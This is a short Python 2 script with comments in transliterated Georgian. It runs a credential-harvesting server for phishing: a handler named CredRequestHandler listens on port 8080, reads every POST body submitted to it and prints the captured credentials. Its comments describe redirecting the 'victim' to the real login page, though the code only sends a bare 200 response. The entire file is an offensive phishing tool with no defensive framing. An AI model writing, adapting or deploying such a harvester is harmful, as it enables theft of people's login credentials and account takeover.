import SimpleHTTPServer
import SocketServer

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        """
        funqciis meshveobit vkitxulobt mosul monacemebs
        da msxverpl vamisamartebt namdvil login gverdze
        """
        # gadmogzavnili kontentis zoma
        content_length = int(self.headers['Content-Length'])
        # kontentis kodireba utf-8
        creds = self.rfile.read(content_length).decode('utf-8')
        # kontentis dabewvda
        print creds
        # gadamisamartebis hederis kodi	
        self.send_response(200)
        self.end_headers()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()
